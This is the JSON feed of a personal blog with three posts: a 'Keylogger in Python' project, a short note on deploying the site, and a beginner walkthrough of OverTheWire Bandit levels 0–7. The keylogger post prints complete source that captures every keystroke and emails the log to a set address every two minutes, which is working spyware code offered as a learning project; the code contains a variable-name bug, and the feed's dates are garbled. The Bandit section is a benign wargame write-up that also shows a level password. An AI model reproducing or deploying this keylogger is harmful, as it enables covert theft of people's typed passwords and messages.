{
  "version": "https://jsonfeed.org/version/1",
  "title": "rajkive",
  "home_page_url": "https://rajkive.github.io/",
  "feed_url": "https://rajkive.github.io/feed.json",
  "description": "A minimal hugo theme focus on content",
  "favicon": "https://rajkive.github.io//assets/favicon.ico",
  "expired": false,
  "author": {
    "name": "rajkive",
    "url": "https://rajkive.github.io/"
  },
  "items": [
    
    

    
    {
      "id": "97621b9217ff47030994269586a1f865500526e9",
      "title": "Keylogger in Python",
      "summary": "",
      "content_text": "Keylogger in Python - A passion project (sort of) I tried my hands on making a keylogger, fully in python, and I learnt a lot! The inspiration behind this project is Grant Collin\u0026rsquo;s video on trying to make one. I followed his foot-steps for the structure but the implementation was purely from my thought process.\nLink to the project: https://github.com/rajkive/py-key-logger\nWhat is a Keylogger? A keylogger is a program that records every keystroke made on a keyboard. In this project, your keylogger will:\nCapture keystrokes\nStore them temporarily\nSend them to your email every 120 seconds (2 minutes)\nThere are some pre-requisites for this project. Mainly these dependencies: pynput.keyboard, threading, smtplib, subprocess It is good to have some knowledge of the syntax and how they work but if not, then this is the perfect opportunity to get familiar with it.\nThe general flow for the program was fairly simple. Set-up email configurations -\u0026gt; Implement function to start capturing keystrokes -\u0026gt; Send logs via email -\u0026gt; using timer for repeated execution.\nI tried to keep it simple and code the basic functionalities for each step. The only problem I encounterd was with smpt config for google. If you are using a gmail for this set-up there might be some problems with 2-factor auth or passkeys if the option is enabled. To debug it, I used a temp email for the reveiver and an Ethereal Email which create a free fake SMTP service for developers.\nOverall this was a very fun project to do and took less than 2hrs. It was a good intro to lots of concepts essential for cyber and networking.\nCode: import subprocess, smtplib, threading\rfrom pynput.keyboard import Key, Listener\rsender_email = \u0026#34;sender-example@gmail.com\u0026#34;\rsender_password = \u0026#34;12345678\u0026#34;\rreceiver_email = \u0026#34;example@gmail.com\u0026#34;\ropen(\u0026#34;log.txt\u0026#34;, \u0026#34;a\u0026#34;).close()\rdef logging(key):\rtry:\rlog = key.char\rexcept AttributeError:\rif key == Key.space:\rlog = \u0026#39; \u0026#39;\relif key == Key.enter:\rlog = \u0026#39;\\n\u0026#39;\relif key == Key.tab:\rlog = \u0026#39;\\t\u0026#39;\relse:\rlog = f\u0026#39; [{key.name}] \u0026#39;\rwith open(\u0026#34;log.txt\u0026#34;, \u0026#34;a\u0026#34;) as f:\rf.write(log)\rdef send_mail():\rwith open(\u0026#34;log.txt\u0026#34;, \u0026#34;r\u0026#34;) as file:\rlog_data = file.read()\rwith smtplib.SMTP(\u0026#34;smtp.gmail.com\u0026#34;, 587) as server:\rserver.starttls()\rserver.login(sender_email, sender_password)\rserver.sendmail(sender_email, receiver_email, loga_data)\r# clear the file after sending the email\rwith open(\u0026#34;log.txt\u0026#34;, \u0026#34;w\u0026#34;) as file:\rfile.write(\u0026#34;\u0026#34;)\rthreading.Timer(120, send_mail).start()\rsend_mail()\rwith Listener(on_press=logging) as listener:\rlistener.join() ",
      "content_html": "\u003ch2 id=\"keylogger-in-python---a-passion-project-sort-of\"\u003eKeylogger in Python - A passion project (sort of)\u003c/h2\u003e\n\u003cp\u003eI tried my hands on making a keylogger, fully in python, and I learnt a \u003cstrong\u003elot\u003c/strong\u003e! The inspiration behind this project is Grant Collin\u0026rsquo;s video on trying to make one. I followed his foot-steps for the structure but the implementation was purely from my thought process.\u003c/p\u003e\n\u003cp\u003eLink to the project: \u003ca href=\"https://github.com/rajkive/py-key-logger\"\u003ehttps://github.com/rajkive/py-key-logger\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"what-is-a-keylogger\"\u003eWhat is a Keylogger?\u003c/h3\u003e\n\u003cp\u003eA keylogger is a program that records every keystroke made on a keyboard. In this project, your keylogger will:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eCapture keystrokes\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eStore them temporarily\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSend them to your email every 120 seconds (2 minutes)\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are some pre-requisites for this project. Mainly these dependencies: \u003ccode\u003epynput.keyboard, threading, smtplib, subprocess\u003c/code\u003e It is good to have some knowledge of the syntax and how they work but if not, then this is the perfect opportunity to get familiar with it.\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003eThe general flow for the program was fairly simple. Set-up email configurations -\u0026gt; Implement function to start capturing keystrokes -\u0026gt; Send logs via email -\u0026gt; using timer for repeated execution.\u003c/p\u003e\n\u003cp\u003eI tried to keep it simple and code the basic functionalities for each step. The only problem I encounterd was with smpt config for google. If you are using a gmail for this set-up there might be some problems with 2-factor auth or passkeys if the option is enabled. To debug it, I used a temp email for the reveiver and an Ethereal Email which create a free fake SMTP service for developers.\u003c/p\u003e\n\u003cp\u003eOverall this was a very fun project to do and took less than 2hrs. It was a good intro to lots of concepts essential for cyber and networking.\u003c/p\u003e\n\u003ch4 id=\"code\"\u003eCode:\u003c/h4\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eimport subprocess, smtplib, threading\r\nfrom pynput.keyboard import Key, Listener\r\n\r\nsender_email = \u0026#34;sender-example@gmail.com\u0026#34;\r\nsender_password = \u0026#34;12345678\u0026#34;\r\nreceiver_email = \u0026#34;example@gmail.com\u0026#34;\r\nopen(\u0026#34;log.txt\u0026#34;, \u0026#34;a\u0026#34;).close()\r\n\r\ndef logging(key):\r\n    try:\r\n        log = key.char\r\n    except AttributeError:\r\n        if key == Key.space:\r\n            log = \u0026#39; \u0026#39;\r\n        elif key == Key.enter:\r\n            log = \u0026#39;\\n\u0026#39;\r\n        elif key == Key.tab:\r\n            log = \u0026#39;\\t\u0026#39;\r\n        else:\r\n            log = f\u0026#39; [{key.name}] \u0026#39;\r\n\r\n    with open(\u0026#34;log.txt\u0026#34;, \u0026#34;a\u0026#34;) as f:\r\n        f.write(log)\r\n\r\n\r\ndef send_mail():\r\n    with open(\u0026#34;log.txt\u0026#34;, \u0026#34;r\u0026#34;) as file:\r\n        log_data = file.read()\r\n        \r\n    with smtplib.SMTP(\u0026#34;smtp.gmail.com\u0026#34;, 587) as server:\r\n        server.starttls()\r\n        server.login(sender_email, sender_password)\r\n        server.sendmail(sender_email, receiver_email, loga_data)\r\n        \r\n\r\n    # clear the file after sending the email\r\n    with open(\u0026#34;log.txt\u0026#34;, \u0026#34;w\u0026#34;) as file:\r\n        file.write(\u0026#34;\u0026#34;)\r\n    \r\n    threading.Timer(120, send_mail).start()\r\n    \r\nsend_mail()\r\n\r\nwith Listener(on_press=logging) as listener:\r\n    listener.join()\n\u003c/code\u003e\u003c/pre\u003e",
      "url": "https://rajkive.github.io/posts/py-keylogger/",
      "date_published": "28076-28-09T70:2828:00+00:00",
      "date_modified": "28076-28-09T70:2828:00+00:00",
      "author": {
        "name": "rajkive",
        "url": "https://rajkive.github.io/"
      }
    },
    
    {
      "id": "d26801875dfb73deba0b2907fa3a692580449414",
      "title": "Hugo be like",
      "summary": "",
      "content_text": "I am happy to share that after MANY failed attempts on trying to deploy it using github actions and choosing between themes, I have finally successfully deployed this blog.\n",
      "content_html": "\u003cp\u003eI am happy to share that after MANY failed attempts on trying to deploy it using github actions and choosing between themes, I have finally successfully deployed this blog.\u003c/p\u003e\n",
      "url": "https://rajkive.github.io/posts/my-first-post/",
      "date_published": "18066-18-09T60:1818:00+00:00",
      "date_modified": "18066-18-09T60:1818:00+00:00",
      "author": {
        "name": "rajkive",
        "url": "https://rajkive.github.io/"
      }
    },
    
    {
      "id": "b6f4b24d50dea8596a74875a6f3af618ad8e7e69",
      "title": "Over the Wire Bandit",
      "summary": "",
      "content_text": "One of the best resources that I\u0026rsquo;ve been recommended to learn linux commands is Over the Wire. It\u0026rsquo;s a gamified way to learn different concepts in cybersecurity, one such game is called bandit which primarily focuses on using different commands to find a text/flag which in our case is the password for next level.\nIn order to get started, I had to in through ssh with the format username@bandit.overthewire.org on port 2220.\nFew things to know This is a simple write-up of levels from 0 to however many I can solve. I\u0026rsquo;m giving the answers through my thought process and there is always the case where there are different ways to approach the same question.\nBefore you start, there are few things you will need to know, first to use the man page for commands and their arguments. Second, some common commands and arguments to know:\ncat: how view the content in the terminal ls -a : to view all the files in a directory, even the hidden ones cat ./ : use ./ when dealing with weird file names like \u0026ldquo;-\u0026rdquo; file : to know the file- type of a particular file Third, remember that you\u0026rsquo;re not supposed to know everything, that\u0026rsquo;s why research and search around, this way you will learn more!!!\nAlso don\u0026rsquo;t forget to keep their website open as they have the description of each level, without it you\u0026rsquo;ll be lost.\nLevel 0 \u0026ndash;\u0026gt; Level 1 Here we simply had to use the cat command to display the text in the file, which contains the password for our next level.\nLevel 1 \u0026ndash;\u0026gt; Level 2 Here, I first used the ls -l command to list all the files available, then comes the tricky part. The name of the file is a literal dash, the character \u0026ldquo;-\u0026rdquo;. As I mentioned earlier, when dealing with such files using the ./ is the best way to go ahead. The ./ simply means \u0026ldquo;Look in the current directory.\u0026rdquo; so the command was something like ./- and that\u0026rsquo;s it! We got the password for next level.\nLevel 2 \u0026ndash;\u0026gt; Level 3 In the this level, we\u0026rsquo;re faced with another weird filename, it has spaces in it\u0026rsquo;s name and when you try it, the ./ command won\u0026rsquo;t work and the man page isn\u0026rsquo;t of much help either. This is where the \u0026ldquo;doing your own research\u0026rdquo; part comes in.\nThe answer is pretty simple, you need to use \u0026quot; \u0026quot; or double quotes.\nLevel 3 \u0026ndash;\u0026gt; Level 4 This one was a bit tricky for me as you can see in the image. As usual I started using the ls -l command but it did not work, as it\u0026rsquo;s just a long listing format or in other words gives you the mode, number of links, owner, group, size (in bytes), and time of last modification for each file. But ls -a commands is the one which will show you all the files. And once you find what you are looking for, simply use the cat command followed by the filename.\nLevel 4 \u0026ndash;\u0026gt; Level 5 Here they have given a very specific description that the flag is in a human-readable format/filetype only. What this usually means is that we need to find the file type which is in format of \u0026ldquo;ASCII\u0026rdquo; characters or text. file command is the way to go for this but there are lot\u0026rsquo;s of file and brute-forcing each one is time consuming and not efficient. Hence we need to parse through the entire directory and for that you need to use the ./* which means \u0026ldquo;in this directory for all\u0026rdquo;, this will give you an output that looks something like in the image below and you\u0026rsquo;ll have your answer\nLevel 5 \u0026ndash;\u0026gt; Level 6 This one was a bit tricky as there are multiple ways to find the answer due to the specifications given in the documentation. The method which I used is using the grep method and searching by du and grep commands with some arguments. As it was given that it has a specific file size, I used du command to search by the file space with -a(all files and not just directories) and -b(bytes) with grep to find the pattern of 1033. And this how I got my answer.\nLevel 6 \u0026ndash;\u0026gt; Level 7 Here, it\u0026rsquo;s kind of the same as the previous levels. Each file is owned by a user and a group. You can see what user and group owns a file with the ls command and its -l tag. To find the file, we will need to run the command from the root directory so we don\u0026rsquo;t miss anything. I used the command find / -type f -user bandit7 -group bandit6 -size 33c and with a little bit of scrolling, I got the answer.\nbandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c\rfind: ‘/var/cache/private’: Permission denied\rfind: ‘/var/cache/apparmor/2425d902.0’: Permission denied\rfind: ‘/var/cache/apparmor/baad73a1.0’: Permission denied\rfind: ‘/var/lib/polkit-1’: Permission denied\rfind: ‘/var/lib/amazon’: Permission denied\r/var/lib/dpkg/info/bandit7.password\rfind: ‘/var/lib/apt/lists/partial’: Permission denied\rfind: ‘/var/lib/chrony’: Permission denied\rfind: ‘/var/lib/snapd/void’: Permission denied\rfind: ‘/var/lib/snapd/cookie’: Permission denied\rfind: ‘/var/lib/private’: Permission denied\rfind: ‘/var/lib/ubuntu-advantage/apt-esm/var/lib/apt/lists/partial’: Permission denied\rbandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password\rmorbNTDkSW6jIlUc0ymOdMaLnOlFVAaj I got to know that there is a way to direct the all the error messages/ permission denied message so we don\u0026rsquo;t have to scroll through a lot. You simply need to add 2\u0026gt;/dev/null at the end of the previous command. It will look something like:\nbandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c 2\u0026gt;/dev/null\r/var/lib/dpkg/info/bandit7.password ",
      "content_html": "\u003cp\u003eOne of the best resources that I\u0026rsquo;ve been recommended to learn linux commands is Over the Wire. It\u0026rsquo;s a gamified way to learn different concepts in cybersecurity, one such game is called \u003cem\u003e\u003cstrong\u003ebandit\u003c/strong\u003e\u003c/em\u003e which primarily focuses on using different commands to find a text/flag which in our case is the password for next level.\u003c/p\u003e\n\u003cp\u003eIn order to get started, I had to in through \u003cem\u003essh\u003c/em\u003e with the format \u003ca href=\"mailto:username@bandit.overthewire.org\"\u003eusername@bandit.overthewire.org\u003c/a\u003e on port 2220.\u003c/p\u003e\n\u003ch2 id=\"few-things-to-know\"\u003eFew things to know\u003c/h2\u003e\n\u003cp\u003eThis is a simple write-up of levels from 0 to however many I can solve.  I\u0026rsquo;m giving the answers through my thought process and there is always the case where there are different ways to approach the same question.\u003c/p\u003e\n\u003cp\u003eBefore you start, there are few things you will need to know, first to use the man page for commands and their arguments. Second, some common commands and arguments to know:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ecat: how view the content in the terminal\u003c/li\u003e\n\u003cli\u003els -a : to view all the files in a directory, even the hidden ones\u003c/li\u003e\n\u003cli\u003ecat ./ : use ./ when dealing with weird file names like \u0026ldquo;-\u0026rdquo;\u003c/li\u003e\n\u003cli\u003efile : to know the file- type of a particular file\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThird, remember that you\u0026rsquo;re not supposed to know everything, that\u0026rsquo;s why research and search around, this way you will learn more!!!\u003c/p\u003e\n\u003cp\u003eAlso don\u0026rsquo;t forget to keep their website open as they have the description of each level, without it you\u0026rsquo;ll be lost.\u003c/p\u003e\n\u003ch2 id=\"level-0--level-1\"\u003eLevel 0 \u0026ndash;\u0026gt; Level 1\u003c/h2\u003e\n\u003cp\u003eHere we simply had to use the \u003cstrong\u003ecat\u003c/strong\u003e command to display the text in the file, which contains the password for our next level.\u003c/p\u003e\n\u003cp\u003e\u003cimg\r\n  src=\"/bandit/l0.png\"\r\n  alt=\"l0\"\r\n  loading=\"lazy\"\r\n  decoding=\"async\"\r\n  class=\"full-width\"\r\n/\u003e\r\n\r\n\u003c/p\u003e\n\u003ch2 id=\"level-1--level-2\"\u003eLevel 1 \u0026ndash;\u0026gt; Level 2\u003c/h2\u003e\n\u003cp\u003eHere, I first used the ls -l command to list all the files available, then comes the tricky part. The name of the file is a literal dash, the character \u0026ldquo;-\u0026rdquo;. As I mentioned earlier, when dealing with such files using the ./ is the best way to go ahead.  The ./ simply means \u0026ldquo;Look in the current directory.\u0026rdquo;\nso the command was something like \u003cstrong\u003e./-\u003c/strong\u003e and that\u0026rsquo;s it! We got the password for next level.\u003c/p\u003e\n\u003cp\u003e\u003cimg\r\n  src=\"/bandit/l1.png\"\r\n  alt=\"l1\"\r\n  loading=\"lazy\"\r\n  decoding=\"async\"\r\n  class=\"full-width\"\r\n/\u003e\r\n\r\n\u003c/p\u003e\n\u003ch2 id=\"level-2--level-3\"\u003eLevel 2 \u0026ndash;\u0026gt; Level 3\u003c/h2\u003e\n\u003cp\u003eIn the this level, we\u0026rsquo;re faced with another weird filename, it has spaces in it\u0026rsquo;s name and when you try it, the ./ command won\u0026rsquo;t work and the man page isn\u0026rsquo;t of much help either. This is where the \u0026ldquo;doing your own research\u0026rdquo; part comes in.\u003c/p\u003e\n\u003cp\u003eThe answer is pretty simple, you need to use \u0026quot; \u0026quot; or double quotes.\u003c/p\u003e\n\u003cp\u003e\u003cimg\r\n  src=\"/bandit/l2.png\"\r\n  alt=\"l2\"\r\n  loading=\"lazy\"\r\n  decoding=\"async\"\r\n  class=\"full-width\"\r\n/\u003e\r\n\r\n\u003c/p\u003e\n\u003ch2 id=\"level-3--level-4\"\u003eLevel 3 \u0026ndash;\u0026gt; Level 4\u003c/h2\u003e\n\u003cp\u003eThis one was a bit tricky for me as you can see in the image. As usual I started using the ls -l command but it did not work, as it\u0026rsquo;s just a long listing format or in other words gives you the mode, number of links, owner, group, size (in bytes), and time of last modification for each file. But ls -a commands is the one which will show you \u003cstrong\u003eall\u003c/strong\u003e the files. And once you find what you are looking for, simply use the cat command followed by the filename.\u003c/p\u003e\n\u003cp\u003e\u003cimg\r\n  src=\"/bandit/l3.png\"\r\n  alt=\"l3\"\r\n  loading=\"lazy\"\r\n  decoding=\"async\"\r\n  class=\"full-width\"\r\n/\u003e\r\n\r\n\u003c/p\u003e\n\u003ch2 id=\"level-4--level-5\"\u003eLevel 4 \u0026ndash;\u0026gt; Level 5\u003c/h2\u003e\n\u003cp\u003eHere they have given a very specific description that the flag is in a human-readable format/filetype only. What this usually means is that we need to find the file type which is in format of \u0026ldquo;ASCII\u0026rdquo; characters or text. file command is the way to go for this but there are lot\u0026rsquo;s of file and brute-forcing each one is time consuming and not efficient. Hence we need to parse through the entire directory and for that you need to use the ./* which means \u0026ldquo;in this directory for all\u0026rdquo;, this will give you an output that looks something like in the image below and you\u0026rsquo;ll have your answer\u003c/p\u003e\n\u003cp\u003e\u003cimg\r\n  src=\"/bandit/l4.png\"\r\n  alt=\"l4\"\r\n  loading=\"lazy\"\r\n  decoding=\"async\"\r\n  class=\"full-width\"\r\n/\u003e\r\n\r\n\u003c/p\u003e\n\u003ch2 id=\"level-5--level-6\"\u003eLevel 5 \u0026ndash;\u0026gt; Level 6\u003c/h2\u003e\n\u003cp\u003eThis one was a bit tricky as there are multiple ways to find the answer due to the specifications given in the documentation. The method which I used is using the grep method and searching by \u003cstrong\u003edu\u003c/strong\u003e and \u003cstrong\u003egrep\u003c/strong\u003e commands with some arguments. As it was given that it has a specific file size, I used du command to search by the file space with -a(all files and not just directories) and -b(bytes) with grep to find the pattern of 1033. And this how I got my answer.\u003c/p\u003e\n\u003cp\u003e\u003cimg\r\n  src=\"/bandit/l5.png\"\r\n  alt=\"l5\"\r\n  loading=\"lazy\"\r\n  decoding=\"async\"\r\n  class=\"full-width\"\r\n/\u003e\r\n\r\n\u003c/p\u003e\n\u003ch2 id=\"level-6--level-7\"\u003eLevel 6 \u0026ndash;\u0026gt; Level 7\u003c/h2\u003e\n\u003cp\u003eHere, it\u0026rsquo;s kind of the same as the previous levels. Each file is owned by a user and a group. You can see what user and group owns a file with the ls command and its -l tag. To find the file, we will need to run the command from the root directory so we don\u0026rsquo;t miss anything. I used the command \u003ccode\u003efind / -type f -user bandit7 -group bandit6 -size 33c\u003c/code\u003e  and with a little bit of scrolling, I got the answer.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ebandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c\r\nfind: ‘/var/cache/private’: Permission denied\r\nfind: ‘/var/cache/apparmor/2425d902.0’: Permission denied\r\nfind: ‘/var/cache/apparmor/baad73a1.0’: Permission denied\r\nfind: ‘/var/lib/polkit-1’: Permission denied\r\nfind: ‘/var/lib/amazon’: Permission denied\r\n/var/lib/dpkg/info/bandit7.password\r\nfind: ‘/var/lib/apt/lists/partial’: Permission denied\r\nfind: ‘/var/lib/chrony’: Permission denied\r\nfind: ‘/var/lib/snapd/void’: Permission denied\r\nfind: ‘/var/lib/snapd/cookie’: Permission denied\r\nfind: ‘/var/lib/private’: Permission denied\r\nfind: ‘/var/lib/ubuntu-advantage/apt-esm/var/lib/apt/lists/partial’: Permission denied\r\n\r\n\r\nbandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password\r\nmorbNTDkSW6jIlUc0ymOdMaLnOlFVAaj\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eI got to know that there is a way to direct the all the error messages/ permission denied message so we don\u0026rsquo;t have to scroll through a lot. You simply need to add \u003ccode\u003e2\u0026gt;/dev/null\u003c/code\u003e at the end of the previous command. It will look something like:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ebandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c 2\u0026gt;/dev/null\r\n/var/lib/dpkg/info/bandit7.password\n\u003c/code\u003e\u003c/pre\u003e",
      "url": "https://rajkive.github.io/posts/over-the-wire-bandit/",
      "date_published": "18066-18-09T60:1818:00+00:00",
      "date_modified": "18066-18-09T60:1818:00+00:00",
      "author": {
        "name": "rajkive",
        "url": "https://rajkive.github.io/"
      }
    }
    
  ]
}